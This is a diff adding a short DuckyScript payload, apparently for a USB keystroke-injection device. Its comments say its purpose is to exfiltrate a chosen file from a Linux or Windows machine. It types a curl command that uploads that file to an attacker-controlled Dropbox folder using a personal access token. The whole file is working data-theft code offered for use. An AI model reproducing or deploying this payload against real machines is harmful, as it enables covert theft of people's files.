@@ -1,0 +1,21 @@
+
+REM Replace 'example' with your personal Dropbox Access Token
+DEFINE #ACCESS_TOKEN example
+
+REM Replace 'example' with the Dropbox destination directory name, for istance /$ZIP_NAME
+DEFINE #DROPBOX_FOLDER example
+
+REM_BLOCK
+    Replace 'example' with the full path of the file that you want to exfiltrate, for istance it can be an archive and in this case should be something like this:
+
+        GNU/Linux:
+        |->     /home/aleff/Documents/archive.zip
+
+        Windows:
+        |->     C:/Users/aleff/Documents/archive.zip
+END_REM
+DEFINE #FILE_TO_EXFILTRATE example
+
+REM Send to Dropbox function
+DELAY 500
+STRINGLN curl -X POST https://content.dropboxapi.com/2/files/upload --header "Authorization: Bearer #ACCESS_TOKEN" --header "Dropbox-API-Arg: {\"path\": \"#DROPBOX_FOLDER\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" --header "Content-Type: application/octet-stream" --data-binary "@#FILE_TO_EXFILTRATE"
